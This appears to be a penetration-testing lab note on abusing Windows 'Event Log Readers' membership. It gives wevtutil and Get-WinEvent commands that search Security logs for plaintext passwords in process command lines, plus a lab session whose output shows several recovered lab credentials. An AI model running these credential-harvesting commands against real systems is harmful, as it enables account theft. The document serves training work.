# Event Log Readers

1) Confirming Group Membership

```
net localgroup "Event Log Readers"

Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.
```

2a) Searching Security Logs Using wevtutil

```
wevtutil qe Security /rd:true /f:text | Select-String "/user"

        Process Command Line:   net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

Passing Credentials to wevtutil :

```
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

OR

2b) Searching Security Logs Using Get-WinEvent

```
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}

CommandLine
-----------
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

## LAB

xfreerdp /v:10.129.205.70 /u:logger /p:HTB_@cademy_stdnt!

net localgroup "Event Log Readers"
Alias name     Event Log Readers
Comment        Members of this group can read event logs from local machine

Members

-------------------------------------------------------------------------------
logger
The command completed successfully.


wevtutil qe Security /rd:true /f:text | Select-String "/user"


        Process Command Line:   cmdkey  /add:WEB01 /user:amanda /pass:Passw0rd!
        Process Command Line:   net  use Z: \\DB01\scripts /user:mary W1ntergreen_gum_2021!
        Process Command Line:   net  use T: \\fs01\backups /user:tim MyStr0ngP@ssword
